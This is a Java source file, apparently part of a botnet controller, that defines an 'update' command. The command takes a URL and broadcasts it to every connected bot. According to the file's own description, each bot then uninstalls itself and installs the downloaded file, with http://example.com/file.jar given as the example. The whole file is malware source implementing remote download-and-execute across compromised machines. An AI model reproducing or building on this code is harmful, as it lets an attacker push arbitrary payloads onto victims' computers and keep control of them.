package com.redpois0n.commands;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.common.packets.Headers;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandUpdate extends Command {

	/**
	 * Update command (From url)
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 1) {
			throw new IllegalArgumentLengthException();
		}
		
		String url = args[0];
		
		for (int i = 0; i < bots.length; i++) {
			try {
				Bot bot = bots[i];
				bot.writeByte(Headers.PACKET_UPDATE);
				bot.writeString(url);
			} catch (Exception ex) {
				Main.handleException(ex);
			}
		}
	}

	@Override
	public String getUsage() {
		return "update [URL]";
	}

	@Override
	public String getExample() {
		return "update http://example.com/file.jar";
	}

	@Override
	public String getDescription() {
		return "Uninstalls itself then installs the downloaded file";
	}

}
